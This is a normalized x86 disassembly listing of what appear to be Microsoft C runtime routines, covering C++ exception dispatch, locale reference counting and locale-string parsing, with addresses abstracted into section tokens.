cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_1002b1cd
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_1002b5ce
pop ecx
pop ecx
sub_1002b8bf
push 0xc
push r--data
call sub_1002fdfc
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_10034b9c
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_10034b9c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10034869
push ebx
push esi
call sub_10034b9c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10034b9c
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_10034b9c
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_10034b9c
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_10034b9c
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_10034b9c
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_1002e960
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_10034b9c
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_1002b623
pop ecx
pop ecx
push eax
push esi
call sub_1002e960
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_1002fe41
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_1002b623
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_1002ba3e
push 0x8
push r--data
call sub_1002fdfc
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1002b623
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1002aef2
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_1002b8bf
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002fe41
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1002b623
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1002aef2
jmp r-xdata
sub_1002bad0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_1002ba3e
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_1002aec0
call sub_1002aef9
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_1002b4a8
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_1002b723
add esp 0x28
test eax eax
je r-xdata
sub_1002bb3e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_1002f139
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_1002f139
lea edi [ eax + 0x80 ]
call sub_1002eee4
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_1002b12c
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_10034869
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1002afb6
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002bad0
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_1002bc32
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_10034869
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_1002f139
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_10034869
call sub_1003481d
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1002bb3e
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_1002f139
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_1002f139
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_1002f139
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_10034b9c
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_1002b12c
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_10034869
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_1002b5ce
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_1002f139
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_1002f139
mov edi [ eax + 0x94 ]
call sub_1002f139
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_1002b65f
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_1002b65f
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_100275b0
test al al
jne r-xdata
call sub_10034869
cmp eax 0x19930522
jne r-xdata
call sub_1002f139
call sub_1002f139
call sub_1002f139
mov [ eax + 0x88 ] esi
call sub_1002f139
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_1002b400
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_1002b5ce
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_1002b3b0
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_1002ae74
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_1002bad0
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_1002aef9
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1002b4a8
add esp 0x10
push [ esi + 0x1c ]
call sub_1002b6da
sub_1002bf96
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1002f139
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_1002bc32
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_1002b4a8
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1002c07c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_1002eeed
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_1002eeed
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_10034bae
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_1002ee72
mov [ esi ] eax
add esi 0x4
push esi
call sub_1002ee72
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1002de41
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1002de41
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_1002ee72
pop ecx
mov [ rw-data ] eax
sub_1002c136
mov edi edi
push esi
push 0x4
push 0x20
call sub_1002ddf5
mov esi eax
push esi
call sub_1002ee72
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_1002c167
push 0xc
push r--data
call sub_1002fdfc
call sub_1002abe7
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_1002c07c
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002c19d
mov eax [ ebp - 0x1c ]
call sub_1002fe41
retn
sub_1002c1ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1002c1f8
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_10034907
test eax eax
je r-xdata
push 0xa
call sub_10031b9e
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_10034914
pop ecx
push 0x3
call sub_1002ae01
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_10027650
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_1002c30f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_1002c330
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10027a85
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10027a85
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10027a85
push [ esi + 0xc0 ]
call sub_10027a85
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_1003506c
push [ edi ]
call sub_10027a85
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_10027a85
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10027a85
pop ecx
push [ esi + 0xb0 ]
call sub_10027a85
push [ esi + 0xbc ]
call sub_10027a85
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10027a85
push [ esi + 0xbc ]
call sub_10035489
pop ecx
pop ecx
push eax
call sub_10027a85
pop ecx
push eax
call sub_10027a85
push [ esi + 0xbc ]
call sub_1003527a
pop ecx
pop ecx
sub_1002c479
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_1002c508
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1002c5a1
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_1002c479
pop ecx
pop edi
sub_1002c5c7
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_1002c479
pop ecx
test esi esi
je r-xdata
push esi
call sub_1002c508
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1002c330
pop ecx
sub_1002c605
push 0xc
push r--data
call sub_1002fdfc
call sub_1002f139
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_100301fe
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_1002c5c7
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002c66f
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1002f139
mov esi [ eax + 0x6c ]
mov eax esi
call sub_1002fe41
retn
push 0x20
call sub_1002ab7b
pop ecx
sub_1002c67b
mov eax [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xa8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xd4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
retn
sub_1002c6ce
push 0x8
push r--data
call sub_1002fdfc
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1002fe41
retn
push 0xd
call sub_100301fe
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002c77b
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_10027a85
pop ecx
push 0xc
call sub_100301fe
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_1002c508
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002c787
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_10027a85
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_1002c330
pop ecx
sub_1002c793
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
dec edi
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100367f7
add esp 0xc
test eax eax
je r-xdata
pop esi
sub_1002c7d3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_10027650
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_10027c10
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_1003686b
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
mov [ edi + 0x8f ] bl
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_1003686b
add esp 0x10
test eax eax
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
cmp bl 0x2c
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_10027c10
test eax eax
sub_1002c8fc
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002e87c
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002c793
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002c793
add esp 0x14
sub_1002c969
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0x10 ] ebx
call sub_1002ddb0
pop ecx
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
mov [ ebp - 0x8 ] ebx
lea ebx [ esi + 0x10 ]
